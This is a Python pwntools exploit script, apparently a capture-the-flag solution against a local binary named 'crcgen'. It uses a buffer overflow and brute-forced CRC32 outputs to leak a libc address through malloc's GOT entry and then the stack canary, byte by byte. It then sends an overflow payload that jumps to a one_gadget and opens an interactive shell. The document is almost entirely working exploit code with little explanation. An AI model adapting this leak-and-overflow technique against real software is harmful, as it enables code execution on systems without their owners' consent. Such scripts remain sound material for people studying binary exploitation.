#!/usr/bin/env python
# -*- coding: UTF-8 -*-
# Auth0r : afang
# nice day mua! :P
# desc:

#lambs:
wait = lambda x: raw_input(x)

# imports

from pwn import *
import time
import os
import sys
import binascii

elf = ""
libc = ""
env = ""
LOCAL = 1
context.log_level = "debug"

p = process("./crcgen", env={"LD_PRELOAD":"./crcgen.so.6"})

p.recvuntil("ice: ")

#step1 , ove

crc_lst = []

def gen_crc(prefix):

    for i in range(0x100):

        data = chr(i)
        f = prefix + data
        crc = hex(0xffffffff & binascii.crc32(f))
        crc_lst.append(crc)

    


def crc(length, data):

    p.sendline("1")
    p.recvuntil("data: ")
    p.sendline(str(length))
    p.recvuntil("process: ")
    p.sendline(data)
    data = p.recvuntil("ice: ")
    return data

malloc_got = 0x601fe0
prefix = "\x7f\x00\x00"
poi = malloc_got - 3

libc_malloc = ""

for i in range(6):

    crcer = crc(4, "a" * 256 + p64(poi)).split("is: ")[1].split("\n")[0]
    gen_crc(prefix)
    idx = crc_lst.index(crcer.lower())
    libc_malloc += chr(idx)
    crc_lst = []
    prefix = prefix[1:] + chr(idx)
    poi = poi + 1

libc = u64(libc_malloc.ljust(8,"\x00")) - 0x84130
print hex(libc)

#start guessing! 
#win when hit!

target = libc + 0x5ec000 + 0x1728
print hex(target)

#leak canary if hit!

poi = target - 3
prefix = "\x00\x00\x00"
canary = ""
crc_lst = []

for i in range(8):


    crcer = crc(4, "a" * 256 + p64(poi)).split("is: ")[1].split("\n")[0]
    gen_crc(prefix)
    idx = crc_lst.index(crcer.lower())
    canary += chr(idx)
    crc_lst = []
    prefix = prefix[1:] + chr(idx)
    poi = poi + 1

canary = u64(canary)
print hex(canary)


#rop.
one = libc + 0xf1117
payload = "a" * 0x58 + p64(canary) + "a" * 0x8 + p64(one)
wait("me")

p.sendline(payload)

p.interactive()


